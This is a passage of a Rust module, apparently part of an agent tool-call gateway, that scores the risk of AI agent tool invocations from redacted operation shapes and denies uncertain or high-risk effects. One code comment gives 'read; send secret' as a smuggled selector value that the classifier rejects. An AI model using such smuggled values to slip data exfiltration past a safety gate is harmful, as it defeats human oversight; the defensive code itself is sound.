//! Deterministic, provider-neutral pre-tool risk/exposure assessment.
//!
//! Deterministic classifications remain authoritative for known effects. In
//! denylist/heuristic mode, callers may use the typed semantic result to
//! resolve an otherwise opaque effect before applying state capabilities. The
//! assessment contains no arguments or payloads.

use crate::{
    bash_classifier::{self, OpClass},
    protocol::ToolInfo,
    shell_ast_shadow::{self, AstShadowAssessment, ParseStatus, ShellAstSemanticShape},
    tool_intent::{NativeToolFamily, native_tool_family},
};
use serde::{Deserialize, Serialize};
use std::sync::OnceLock;
use tokio::sync::mpsc;

#[cfg(test)]
use std::cell::{Cell, RefCell};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RiskBand {
    Low,
    Moderate,
    High,
    Critical,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExposureBand {
    Local,
    External,
    Account,
    Unknown,
}

/// A bounded probability returned by a semantic assessor.  The dimensions in
/// [`SemanticRiskVector`] are intentionally independent rather than a single
/// mutually-exclusive classification.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct Probability(f32);

impl Probability {
    pub fn new(value: f32) -> Result<Self, &'static str> {
        if value.is_finite() && (0.0..=1.0).contains(&value) {
            Ok(Self(value))
        } else {
            Err("probability must be finite and within 0.0..=1.0")
        }
    }

    pub fn get(self) -> f32 {
        self.0
    }
}

/// Independent, Noul-like properties of a pre-tool operation.  `reversible`
/// and `irreversible` are not complements: an assessor may be uncertain, or
/// an operation may have partially recoverable effects.
#[derive(Debug, Clone, PartialEq)]
pub struct SemanticRiskVector {
    pub read_only: Probability,
    pub may_write: Probability,
    pub reversible: Probability,
    pub destructive: Probability,
    pub irreversible: Probability,
    pub external_or_account_effect: Probability,
}

/// Code-owned effect resolution derived from typed semantic probabilities.
/// State capability policy must still authorize the resolved effect.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ResolvedEffect {
    ReadOnly,
    LocalWrite,
    BoundedLocalExecution,
    GitLocalWrite,
    LocalWriteAndGitLocalWrite,
    LocalWriteAndBoundedLocalExecution,
    BoundedLocalExecutionAndGitLocalWrite,
    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
    DenyKnownRisk,
    DenyUncertain,
}

/// Lifecycle status for a semantic result. Only `Assessed` may authorize an
/// otherwise opaque operation; every other outcome fails closed.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SemanticAssessorStatus {
    Disabled,
    Queued,
    Unavailable,
    Timeout,
    Malformed,
    QueueFull,
    Assessed,
}

/// Staging-only controls for the semantic branch.  Production is disabled
/// unless an operator both names the staging environment and opts in.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SemanticShadowConfig {
    pub enabled: bool,
    pub authoritative_enabled: bool,
    pub queue_capacity: usize,
}

impl SemanticShadowConfig {
    pub fn from_values(
        environment: Option<&str>,
        shadow_enabled: Option<&str>,
        fallthrough_enabled: Option<&str>,
        capacity: Option<&str>,
    ) -> Self {
        let telemetry_enabled =
            matches!(environment, Some("staging")) && shadow_enabled_for(shadow_enabled);
        let authoritative_enabled = shadow_enabled_for(fallthrough_enabled);
        let enabled = telemetry_enabled || authoritative_enabled;
        let queue_capacity = capacity
            .and_then(|value| value.parse::<usize>().ok())
            .filter(|value| (1..=1024).contains(value))
            .unwrap_or(64);
        Self {
            enabled,
            authoritative_enabled,
            queue_capacity,
        }
    }

    pub fn from_env() -> Self {
        Self::from_values(
            std::env::var("STATEWRIGHT_ENV").ok().as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_ASSESSMENT")
                .ok()
                .as_deref(),
            std::env::var("STATEWRIGHT_SYSTEM_ONE_FALLTHROUGH")
                .ok()
                .as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_QUEUE_CAPACITY")
                .ok()
                .as_deref(),
        )
    }
}

/// The only context a future semantic worker may receive.  It contains
/// operation shape, never argument values, command text, paths, or payloads.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct SemanticAssessmentRequest {
    pub tool_family: &'static str,
    pub tool_name: String,
    pub state_intent: Option<String>,
    pub argument_keys: Vec<String>,
    pub shell_shape: Vec<bash_classifier::SemanticCommandShape>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub shell_ast_shape: Option<ShellAstSemanticShape>,
    pub read_only_hint: Option<bool>,
    pub destructive_hint: Option<bool>,
    pub open_world_hint: Option<bool>,
    pub mcp_shape: Option<McpInvocationShape>,
}

/// Code-owned effect labels; selector values, schemas and descriptions are
/// never copied into the remote request. These describe intent, not authority.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum McpOperationIntent {
    Read,
    Write,
    Destructive,
    ExternalWrite,
    Unknown,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
pub struct McpInvocationShape {
    pub registered_metadata: bool,
    pub operation: String,
    pub operation_intent: McpOperationIntent,
    pub selector_intent: Option<McpOperationIntent>,
    pub schema_has_selector: bool,
    pub delegates_unknown_effect: bool,
    pub idempotent_hint: Option<bool>,
}

// Strip the MCP transport/server namespace without conflating identities.
// This is only for inference; authorization always retains the full name.
fn mcp_operation(tool_name: &str) -> &str {
    tool_name
        .strip_prefix("mcp__")
        .and_then(|qualified| qualified.split_once("__"))
        .map(|(_, operation)| operation)
        .unwrap_or(tool_name)
}

fn is_agent_delegation_tool(tool_name: &str) -> bool {
    let compact: String = mcp_operation(tool_name)
        .chars()
        .filter(|character| character.is_ascii_alphanumeric())
        .flat_map(char::to_lowercase)
        .collect();
    compact == "agent" || compact == "spawnagent" || compact.ends_with("collaborationspawnagent")
}

fn mcp_operation_intent(operation: &str) -> McpOperationIntent {
    use McpOperationIntent::*;
    let lower = operation.to_ascii_lowercase();
    let words: Vec<_> = lower
        .split(|c: char| !c.is_ascii_alphanumeric())
        .filter(|word| !word.is_empty())
        .collect();
    let has = |verbs: &[&str]| words.iter().any(|word| verbs.contains(word));
    if has(&["delete", "remove", "destroy", "revoke", "purge"]) {
        Destructive
    } else if has(&["send", "publish", "deploy", "push"]) {
        ExternalWrite
    } else if has(&[
        "create", "update", "write", "edit", "patch", "apply", "upload", "move", "rename",
    ]) {
        Write
    } else if words.first().is_some_and(|word| {
        [
            "read", "get", "list", "search", "find", "inspect", "status", "describe", "lookup",
        ]
        .contains(word)
    }) {
        Read
    } else {
        Unknown
    }
}

fn mcp_shape(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
) -> McpInvocationShape {
    use McpOperationIntent::*;
    const SELECTORS: &[&str] = &["action", "operation", "method"];
    let selectors: Vec<_> = SELECTORS
        .iter()
        .filter_map(|key| arguments.get(key))
        .collect();
    // Only exact, fixed vocabulary selector values can be disclosed as labels.
    // "read; send secret" must not get treated as a valid operation selector.
    let intents: Vec<_> = selectors
        .iter()
        .map(|value| match value.as_str() {
            Some(
                "read" | "get" | "list" | "search" | "find" | "inspect" | "status" | "describe"
                | "lookup",
            ) => Read,
            Some(
                "create" | "update" | "write" | "edit" | "patch" | "apply" | "upload" | "move"
                | "rename",
            ) => Write,
            Some("delete" | "remove" | "destroy" | "revoke" | "purge") => Destructive,
            Some("send" | "publish" | "deploy" | "push") => ExternalWrite,
            _ => Unknown,
        })
        .collect();
    let selector_intent = [Destructive, ExternalWrite, Unknown, Write, Read]
        .into_iter()
        .find(|intent| intents.contains(intent));
    let schema_has_selector = tool
        .and_then(|tool| tool.input_schema.get("properties"))
        .is_some_and(|properties| SELECTORS.iter().any(|key| properties.get(key).is_some()));
    let operation = mcp_operation(tool_name);
    let lower_operation = operation.to_ascii_lowercase();
    let first_word = lower_operation
        .split(|c: char| !c.is_ascii_alphanumeric())
        .next()
        .unwrap_or("");
    // Query/execution payloads cannot be judged from a redacted name alone.
    let delegates_unknown_effect = selector_intent == Some(Unknown)
        || (schema_has_selector && selector_intent.is_none())
        || ["query", "execute", "run", "eval"].contains(&first_word)
        || ["command", "cmd", "script", "code", "sql"]
            .iter()
            .any(|key| arguments.get(key).is_some());
    McpInvocationShape {
        registered_metadata: tool.is_some(),
        operation: bounded_metadata_label(operation),
        operation_intent: mcp_operation_intent(operation),
        selector_intent,
        schema_has_selector,
        delegates_unknown_effect,
        idempotent_hint: tool
            .and_then(|tool| tool.annotations.as_ref())
            .and_then(|hints| hints.idempotent_hint),
    }
}

/// A provider-neutral seam for a later local/open-weight worker.  The worker
/// owns scheduling, timeout, and transport; this trait cannot authorize an
/// invocation and receives only [`SemanticAssessmentRequest`].
pub trait SemanticAssessor {
    fn assess(
        &self,
        request: &SemanticAssessmentRequest,
    ) -> Result<SemanticRiskVector, SemanticAssessorStatus>;
}

#[derive(Debug, Clone, PartialEq)]
pub struct SemanticAssessmentReceipt {
    pub tool: String,
    pub status: SemanticAssessorStatus,
    pub vector: Option<SemanticRiskVector>,
    pub state_intent: Option<String>,
}

/// The assessment that travels with a pre-tool pipeline response. Raw model
/// output remains separate from the code-owned authorization thresholds.
#[derive(Debug, Clone, PartialEq)]
pub struct RiskPipelineAssessment {
    pub deterministic: ShadowAssessment,
    pub semantic: SemanticAssessmentReceipt,
    pub effective_risk: RiskBand,
    pub semantic_failsafe_escalated: bool,
    pub semantic_authorization_enabled: bool,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum FinalDecisionContext<'a> {
    Allowed,
    Denied {
        basis: &'a str,
        required_authority: &'a str,
    },
}

impl<'a> FinalDecisionContext<'a> {
    pub const fn denied(basis: &'a str, required_authority: &'a str) -> Self {
        Self::Denied {
            basis,
            required_authority,
        }
    }
}

impl RiskPipelineAssessment {
    fn reformulation_allowed(basis: &str) -> bool {
        matches!(
            basis,
            "semantic_threshold_not_met"
                | "incomplete_structural_evidence"
                | "semantic_vector_unavailable"
                | "semantic_assessment_incomplete"
                | "semantic_authorization_disabled"
        )
    }

    fn intent_fingerprint(&self) -> String {
        // Fingerprint only the already-redacted semantic request.  Provider
        // shims use this identity to recognize a repeated intent without
        // retaining command text, paths, arguments, or payload values.
        let bytes = self
            .deterministic
            .semantic_request
            .as_ref()
            .and_then(|request| serde_json::to_vec(request).ok())
            .unwrap_or_else(|| {
                format!(
                    "{}|{}|{}",
                    self.semantic.tool,
                    self.deterministic.source,
                    self.deterministic.required_capability.unwrap_or("none")
                )
                .into_bytes()
            });
        format!(
            "intent_v1_{}",
            uuid::Uuid::new_v5(&uuid::Uuid::NAMESPACE_OID, &bytes).as_simple()
        )
    }

    fn deterministic_local_effect(&self) -> ResolvedEffect {
        match self.deterministic.required_capability {
            Some("BoundedLocalExecution") => ResolvedEffect::BoundedLocalExecution,
            Some("GitLocalWrite") => ResolvedEffect::GitLocalWrite,
            Some("Write+GitLocalWrite") => ResolvedEffect::LocalWriteAndGitLocalWrite,
            Some("Write+BoundedLocalExecution") => {
                ResolvedEffect::LocalWriteAndBoundedLocalExecution
            }
            Some("BoundedLocalExecution+GitLocalWrite") => {
                ResolvedEffect::BoundedLocalExecutionAndGitLocalWrite
            }
            Some("Write+BoundedLocalExecution+GitLocalWrite") => {
                ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite
            }
            _ => ResolvedEffect::LocalWrite,
        }
    }

    fn semantic_local_effect(&self) -> ResolvedEffect {
        match self.deterministic.required_capability {
            Some("BoundedLocalExecution") => ResolvedEffect::LocalWriteAndBoundedLocalExecution,
            Some("GitLocalWrite" | "Write+GitLocalWrite") => {
                ResolvedEffect::LocalWriteAndGitLocalWrite
            }
            Some("Write+BoundedLocalExecution") => {
                ResolvedEffect::LocalWriteAndBoundedLocalExecution
            }
            Some(
                "BoundedLocalExecution+GitLocalWrite" | "Write+BoundedLocalExecution+GitLocalWrite",
            ) => ResolvedEffect::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite,
            _ => ResolvedEffect::LocalWrite,
        }
    }

    /// Resolve an effect class without letting inference downgrade a known
    /// high/critical operation or silently authorize an uncertain result.
    /// This is not final authorization: callers must enforce the state's
    /// explicit capability denials against `ReadOnly` or `LocalWrite`.
    pub fn resolve_effect(&self) -> ResolvedEffect {
        self.resolve_effect_with_basis().0
    }

    /// Return the selected effect and a stable, payload-free explanation code.
    pub fn resolve_effect_with_basis(&self) -> (ResolvedEffect, &'static str) {
        use ResolvedEffect::*;
        if matches!(self.effective_risk, RiskBand::High | RiskBand::Critical) {
            return (DenyKnownRisk, "effective_known_risk");
        }
        match self.deterministic.risk {
            RiskBand::Critical | RiskBand::High => (DenyKnownRisk, "deterministic_known_risk"),
            RiskBand::Low if self.effective_risk == RiskBand::Low => {
                (ReadOnly, "deterministic_read_only")
            }
            RiskBand::Low => (LocalWrite, "semantic_risk_escalation"),
            RiskBand::Moderate if self.deterministic.exposure == ExposureBand::Local => {
                let effect = self.deterministic_local_effect();
                let basis = match effect {
                    BoundedLocalExecution => "deterministic_bounded_local_execution",
                    GitLocalWrite => "deterministic_git_local_write",
                    LocalWriteAndGitLocalWrite => "deterministic_combined_local_write",
                    LocalWriteAndBoundedLocalExecution => {
                        "deterministic_local_write_and_bounded_execution"
                    }
                    BoundedLocalExecutionAndGitLocalWrite => {
                        "deterministic_bounded_execution_and_git_local_write"
                    }
                    LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
                        "deterministic_combined_local_execution"
                    }
                    _ => "deterministic_local_write",
                };
                (effect, basis)
            }
            RiskBand::Moderate if self.deterministic.exposure == ExposureBand::Unknown => {
                if !self.semantic_authorization_enabled {
                    return (DenyUncertain, "semantic_authorization_disabled");
                }
                if !self.has_sufficient_semantic_evidence() {
                    return (DenyUncertain, "incomplete_structural_evidence");
                }
                let Some(vector) = self.semantic.vector.as_ref() else {
                    return (DenyUncertain, "semantic_vector_unavailable");
                };
                if self.semantic.status != SemanticAssessorStatus::Assessed {
                    return (DenyUncertain, "semantic_assessment_incomplete");
                }
                let request = self.deterministic.semantic_request.as_ref().unwrap();
                let compatible_read = self.deterministic.required_capability.is_none()
                    && request.read_only_hint != Some(false)
                    && request.mcp_shape.as_ref().is_none_or(|shape| {
                        shape.operation_intent != McpOperationIntent::Write
                            && shape.selector_intent != Some(McpOperationIntent::Write)
                    });
                if compatible_read
                    && vector.read_only.get() >= 0.90
                    && vector.may_write.get() <= 0.10
                    && vector.destructive.get() <= 0.05
                    && vector.irreversible.get() <= 0.05
                    && vector.external_or_account_effect.get() <= 0.05
                {
                    (ReadOnly, "semantic_read_only")
                } else if vector.may_write.get() >= 0.90
                    && vector.reversible.get() >= 0.80
                    && vector.destructive.get() <= 0.05
                    && vector.irreversible.get() <= 0.05
                    && vector.external_or_account_effect.get() <= 0.05
                {
                    (self.semantic_local_effect(), "semantic_local_write")
                } else {
                    (DenyUncertain, "semantic_threshold_not_met")
                }
            }
            RiskBand::Moderate => (DenyKnownRisk, "deterministic_nonlocal_risk"),
        }
    }

    fn has_sufficient_semantic_evidence(&self) -> bool {
        self.deterministic
            .semantic_request
            .as_ref()
            .is_some_and(|request| {
                if request.tool_family == "shell" {
                    request.shell_ast_shape.as_ref().is_some_and(|shape| {
                        shape.status == ParseStatus::Parsed
                            && shape.executable_nodes > 0
                            && !shape.effect_candidates.is_empty()
                            && shape.foreign_code_units
                                == shape.foreign_code_units_with_complete_effect_evidence
                            && !request.shell_shape.is_empty()
                    }) || (!request.shell_shape.is_empty()
                        && request.shell_shape.iter().all(|segment| {
                            segment.operation.is_some() && !segment.delegates_unknown_effect
                        }))
                } else {
                    request.tool_name != "unknown"
                        && request
                            .mcp_shape
                            .as_ref()
                            .is_some_and(|shape| !shape.delegates_unknown_effect)
                }
            })
    }

    /// Redacted, stable response shape for adapters and hooks.  It contains
    /// labels and bounded probabilities only--never arguments, command text,
    /// paths, or payload values.
    pub fn visible_json(&self) -> serde_json::Value {
        self.visible_json_for_decision(FinalDecisionContext::Allowed)
    }

    /// Attach the final policy decision to the classifier receipt. A
    /// classifier-resolved read or local write may still be denied by the
    /// workflow capability or interceptor, in which case an equivalent retry
    /// must not be suggested.
    pub fn visible_json_for_decision(
        &self,
        final_decision: FinalDecisionContext<'_>,
    ) -> serde_json::Value {
        let (resolved_effect, resolution_basis) = self.resolve_effect_with_basis();
        let (decision_allowed, final_denial_basis, required_authority) = match final_decision {
            FinalDecisionContext::Allowed => (
                true,
                serde_json::Value::Null,
                resolved_effect.required_authority(),
            ),
            FinalDecisionContext::Denied {
                basis,
                required_authority,
            } => (false, serde_json::json!(basis), required_authority),
        };
        let effective_denial_basis = final_denial_basis.as_str().unwrap_or(resolution_basis);
        let reformulation_allowed = matches!(resolved_effect, ResolvedEffect::DenyUncertain)
            && Self::reformulation_allowed(effective_denial_basis);
        let exact_invocation_retry_allowed = decision_allowed
            && !matches!(
                resolved_effect,
                ResolvedEffect::DenyKnownRisk | ResolvedEffect::DenyUncertain
            );
        // A human may resolve classifier uncertainty only when the gateway's
        // final decision explicitly offers the separate-approval authority.
        // Capability, policy, interceptor, and known-risk denials must never
        // become approvable merely because an adapter recognizes their label.
        let separate_approval_allowed = !decision_allowed
            && matches!(resolved_effect, ResolvedEffect::DenyUncertain)
            && reformulation_allowed
            && required_authority == "complete_structural_evidence_or_separate_approval";
        let vector = self.semantic.vector.as_ref().map(|value| {
            serde_json::json!({
                "read_only": value.read_only.get(),
                "may_write": value.may_write.get(),
                "reversible": value.reversible.get(),
                "destructive": value.destructive.get(),
                "irreversible": value.irreversible.get(),
                "external_or_account_effect": value.external_or_account_effect.get(),
            })
        });
        serde_json::json!({
            "intent_fingerprint": self.intent_fingerprint(),
            "invocation_fingerprint": self.deterministic.invocation_fingerprint,
            "deterministic_risk": format!("{:?}", self.deterministic.risk),
            "deterministic_exposure": format!("{:?}", self.deterministic.exposure),
            "deterministic_source": self.deterministic.source,
            "effective_risk": format!("{:?}", self.effective_risk),
            "semantic_status": format!("{:?}", self.semantic.status),
            "semantic_vector": vector,
            "semantic_failsafe_escalated": self.semantic_failsafe_escalated,
            "semantic_authorization_enabled": self.semantic_authorization_enabled,
            "resolved_effect": resolved_effect.label(),
            "resolution_basis": resolution_basis,
            "final_denial_basis": final_denial_basis,
            "required_authority": required_authority,
            // Compatibility field consumed by existing adapters. For an
            // uncertain classifier denial it means the agent may reformulate
            // the request on the failed structural axis; it never authorizes
            // replaying the exact denied invocation.
            "equivalent_retry_allowed": exact_invocation_retry_allowed || reformulation_allowed,
            "reformulation_allowed": reformulation_allowed,
            "exact_invocation_retry_allowed": exact_invocation_retry_allowed,
            "separate_approval_allowed": separate_approval_allowed,
        })
    }

    pub fn visible_json_for_denial(
        &self,
        basis: &str,
        required_authority: &str,
    ) -> serde_json::Value {
        self.visible_json_for_decision(FinalDecisionContext::denied(basis, required_authority))
    }
}

impl ResolvedEffect {
    pub const fn label(self) -> &'static str {
        match self {
            Self::ReadOnly => "read_only",
            Self::LocalWrite => "local_write",
            Self::BoundedLocalExecution => "bounded_local_execution",
            Self::GitLocalWrite => "git_local_write",
            Self::LocalWriteAndGitLocalWrite => "local_write_and_git_local_write",
            Self::LocalWriteAndBoundedLocalExecution => "local_write_and_bounded_local_execution",
            Self::BoundedLocalExecutionAndGitLocalWrite => {
                "bounded_local_execution_and_git_local_write"
            }
            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
                "local_write_and_bounded_local_execution_and_git_local_write"
            }
            Self::DenyKnownRisk => "deny_known_risk",
            Self::DenyUncertain => "deny_uncertain",
        }
    }

    pub const fn required_authority(self) -> &'static str {
        match self {
            Self::ReadOnly => "Read",
            Self::LocalWrite => "Write",
            Self::BoundedLocalExecution => "BoundedLocalExecution",
            Self::GitLocalWrite => "GitLocalWrite",
            Self::LocalWriteAndGitLocalWrite => "Write+GitLocalWrite",
            Self::LocalWriteAndBoundedLocalExecution => "Write+BoundedLocalExecution",
            Self::BoundedLocalExecutionAndGitLocalWrite => "BoundedLocalExecution+GitLocalWrite",
            Self::LocalWriteAndBoundedLocalExecutionAndGitLocalWrite => {
                "Write+BoundedLocalExecution+GitLocalWrite"
            }
            Self::DenyKnownRisk => "separate_approved_execution_path",
            Self::DenyUncertain => "complete_structural_evidence_or_separate_approval",
        }
    }
}

pub struct SemanticAssessmentJob {
    request: SemanticAssessmentRequest,
    response: Option<tokio::sync::oneshot::Sender<SemanticAssessmentReceipt>>,
}

#[derive(Clone)]
struct SemanticProviderConfig {
    kind: SemanticProviderKind,
    endpoint: String,
    model: String,
    bearer_token: Option<String>,
    timeout: std::time::Duration,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum SemanticProviderKind {
    OpenAiCompatible,
    TypeSafeSystemOne,
}

impl SemanticProviderConfig {
    fn from_env() -> Option<Self> {
        Self::from_values(
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_PROVIDER_KIND")
                .ok()
                .as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_PROVIDER_URL")
                .ok()
                .as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_MODEL")
                .ok()
                .as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_PROVIDER_TOKEN")
                .ok()
                .as_deref(),
            std::env::var("TYPESAFE_API_KEY").ok().as_deref(),
            std::env::var("STATEWRIGHT_SEMANTIC_RISK_TIMEOUT_MS")
                .ok()
                .as_deref(),
        )
    }

    fn from_values(
        explicit_kind: Option<&str>,
        endpoint: Option<&str>,
        model: Option<&str>,
        provider_token: Option<&str>,
        typesafe_api_key: Option<&str>,
        timeout_ms: Option<&str>,
    ) -> Option<Self> {
        let endpoint = endpoint.filter(|value| !value.trim().is_empty());
        let kind = match explicit_kind.map(str::trim) {
            Some("typesafe_system_one" | "typesafe" | "jev") => {
                SemanticProviderKind::TypeSafeSystemOne
            }
            Some("openai_compatible" | "openai") => SemanticProviderKind::OpenAiCompatible,
            Some(_) => return None,
            None if endpoint.is_some() => SemanticProviderKind::OpenAiCompatible,
            None if typesafe_api_key.is_some_and(|value| !value.trim().is_empty()) => {
                SemanticProviderKind::TypeSafeSystemOne
            }
            None => SemanticProviderKind::OpenAiCompatible,
        };
        let endpoint = endpoint.map(str::to_owned).or_else(|| {
            (kind == SemanticProviderKind::TypeSafeSystemOne)
                .then(|| "https://api.typesafe.ai/v1/systemone".to_owned())
        })?;
        let model = model
            .filter(|value| !value.trim().is_empty())
            .map(str::to_owned)
            .or_else(|| {
                (kind == SemanticProviderKind::TypeSafeSystemOne).then(|| "jev-latest".to_owned())
            })?;
        let timeout_ms = timeout_ms
            .and_then(|value| value.parse::<u64>().ok())
            .filter(|value| (50..=5_000).contains(value))
            .unwrap_or(1_500);
        let provider_token = provider_token
            .filter(|value| !value.trim().is_empty())
            .map(str::to_owned);
        let bearer_token = match kind {
            SemanticProviderKind::OpenAiCompatible => provider_token,
            SemanticProviderKind::TypeSafeSystemOne => provider_token.or_else(|| {
                typesafe_api_key
                    .filter(|value| !value.trim().is_empty())
                    .map(str::to_owned)
            }),
        };
        if kind == SemanticProviderKind::TypeSafeSystemOne && bearer_token.is_none() {
            return None;
        }
        Some(Self {
            kind,
            endpoint: endpoint.trim_end_matches('/').to_owned(),
            model,
            bearer_token,
            timeout: std::time::Duration::from_millis(timeout_ms),
        })
    }
}

/// Bounded, non-blocking queue used by a future local/open-weight worker.  A
/// full queue yields telemetry only; it can never slow down or change a tool
/// authorization decision.
#[derive(Clone)]
pub struct SemanticAssessmentQueue {
    sender: mpsc::Sender<SemanticAssessmentJob>,
}

impl SemanticAssessmentQueue {
    pub fn new(capacity: usize) -> (Self, mpsc::Receiver<SemanticAssessmentJob>) {
        let (sender, receiver) = mpsc::channel(capacity.max(1));
        (Self { sender }, receiver)
    }

    pub fn try_submit(
        &self,
        request: SemanticAssessmentRequest,
    ) -> Result<(), SemanticAssessorStatus> {
        self.try_submit_job(SemanticAssessmentJob {
            request,
            response: None,
        })
    }

    fn try_submit_with_response(
        &self,
        request: SemanticAssessmentRequest,
    ) -> Result<tokio::sync::oneshot::Receiver<SemanticAssessmentReceipt>, SemanticAssessorStatus>
    {
        let (sender, receiver) = tokio::sync::oneshot::channel();
        self.try_submit_job(SemanticAssessmentJob {
            request,
            response: Some(sender),
        })?;
        Ok(receiver)
    }

    fn try_submit_job(&self, job: SemanticAssessmentJob) -> Result<(), SemanticAssessorStatus> {
        self.sender.try_send(job).map_err(|error| match error {
            mpsc::error::TrySendError::Full(_) => SemanticAssessorStatus::QueueFull,
            mpsc::error::TrySendError::Closed(_) => SemanticAssessorStatus::Unavailable,
        })
    }
}

/// OpenAI-compatible response envelope. The provider receives only the
/// redacted operation shape and must return JSON containing the six fields.
#[derive(Deserialize)]
struct SemanticProviderResponse {
    choices: Vec<SemanticProviderChoice>,
}
#[derive(Deserialize)]
struct SemanticProviderChoice {
    message: SemanticProviderMessage,
}
#[derive(Deserialize)]
struct SemanticProviderMessage {
    content: Option<String>,
}
#[derive(Deserialize)]
struct SemanticVectorWire {
    read_only: f32,
    may_write: f32,
    reversible: f32,
    destructive: f32,
    irreversible: f32,
    external_or_account_effect: f32,
}

#[derive(Deserialize)]
struct TypeSafeProviderResponse {
    answers: TypeSafeAnswers,
}
#[derive(Deserialize)]
struct TypeSafeAnswers {
    read_only: TypeSafeNoulAnswer,
    may_write: TypeSafeNoulAnswer,
    reversible: TypeSafeNoulAnswer,
    destructive: TypeSafeNoulAnswer,
    irreversible: TypeSafeNoulAnswer,
    external_or_account_effect: TypeSafeNoulAnswer,
}
#[derive(Deserialize)]
struct TypeSafeNoulAnswer {
    #[serde(rename = "type")]
    answer_type: String,
    noul: f32,
}

async fn assess_with_provider(
    client: &reqwest::Client,
    provider: &SemanticProviderConfig,
    request: &SemanticAssessmentRequest,
) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
    let mut request_shape = serde_json::json!({
        "tool_family": request.tool_family, "tool_name": request.tool_name,
        "state_intent": request.state_intent, "argument_keys": request.argument_keys,
        "shell_shape": request.shell_shape,
        "mcp_shape": request.mcp_shape,
        "read_only_hint": request.read_only_hint, "destructive_hint": request.destructive_hint,
        "open_world_hint": request.open_world_hint,
    });
    if let Some(shape) = request.shell_ast_shape.as_ref() {
        request_shape["shell_ast_shape"] = serde_json::json!(shape);
    }
    let (url, body) = match provider.kind {
        SemanticProviderKind::OpenAiCompatible => (
            format!("{}/chat/completions", provider.endpoint),
            serde_json::json!({
                "model": provider.model,
                "temperature": 0.0,
                "max_tokens": 160,
                "messages": [
                    {"role":"system","content":"Return JSON only with independent numbers 0..1: read_only, may_write, reversible, destructive, irreversible, external_or_account_effect. Assess only the supplied redacted operation shape."},
                    {"role":"user","content": request_shape.to_string()}
                ]
            }),
        ),
        SemanticProviderKind::TypeSafeSystemOne => (
            provider.endpoint.clone(),
            serde_json::json!({
                "state": request_shape,
                "model": provider.model,
                "questions": {
                    "read_only": {"type":"noul", "instructions":"Does this operation only observe state without changing local, remote, or account state?"},
                    "may_write": {"type":"noul", "instructions":"May this operation change local files, processes, sessions, or configuration?"},
                    "reversible": {"type":"noul", "instructions":"If this operation changes state, is the change locally reversible without external coordination?"},
                    "destructive": {"type":"noul", "instructions":"May this operation delete, overwrite, corrupt, or terminate resources?"},
                    "irreversible": {"type":"noul", "instructions":"May this operation cause an effect that cannot be reliably undone?"},
                    "external_or_account_effect": {"type":"noul", "instructions":"May this operation change remote, network, hosted-service, or user-account state?"}
                }
            }),
        ),
    };
    let mut call = client.post(url).json(&body);
    if let Some(token) = &provider.bearer_token {
        call = call.bearer_auth(token);
    }
    let response = call
        .send()
        .await
        .map_err(|error| {
            if error.is_timeout() {
                SemanticAssessorStatus::Timeout
            } else {
                SemanticAssessorStatus::Unavailable
            }
        })?
        .error_for_status()
        .map_err(|_| SemanticAssessorStatus::Unavailable)?;
    let body = response.bytes().await.map_err(|error| {
        if error.is_timeout() {
            SemanticAssessorStatus::Timeout
        } else {
            SemanticAssessorStatus::Unavailable
        }
    })?;
    let wire = match provider.kind {
        SemanticProviderKind::OpenAiCompatible => {
            let envelope: SemanticProviderResponse =
                serde_json::from_slice(&body).map_err(|_| SemanticAssessorStatus::Malformed)?;
            let content = envelope
                .choices
                .into_iter()
                .next()
                .and_then(|choice| choice.message.content)
                .ok_or(SemanticAssessorStatus::Malformed)?;
            serde_json::from_str(content.trim().trim_matches('`').trim_start_matches("json"))
                .map_err(|_| SemanticAssessorStatus::Malformed)?
        }
        SemanticProviderKind::TypeSafeSystemOne => {
            let envelope: TypeSafeProviderResponse =
                serde_json::from_slice(&body).map_err(|_| SemanticAssessorStatus::Malformed)?;
            let answers = envelope.answers;
            if [
                &answers.read_only,
                &answers.may_write,
                &answers.reversible,
                &answers.destructive,
                &answers.irreversible,
                &answers.external_or_account_effect,
            ]
            .iter()
            .any(|answer| answer.answer_type != "noul")
            {
                return Err(SemanticAssessorStatus::Malformed);
            }
            SemanticVectorWire {
                read_only: answers.read_only.noul,
                may_write: answers.may_write.noul,
                reversible: answers.reversible.noul,
                destructive: answers.destructive.noul,
                irreversible: answers.irreversible.noul,
                external_or_account_effect: answers.external_or_account_effect.noul,
            }
        }
    };
    Ok(SemanticRiskVector {
        read_only: Probability::new(wire.read_only)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
        may_write: Probability::new(wire.may_write)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
        reversible: Probability::new(wire.reversible)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
        destructive: Probability::new(wire.destructive)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
        irreversible: Probability::new(wire.irreversible)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
        external_or_account_effect: Probability::new(wire.external_or_account_effect)
            .map_err(|_| SemanticAssessorStatus::Malformed)?,
    })
}

fn spawn_semantic_worker(
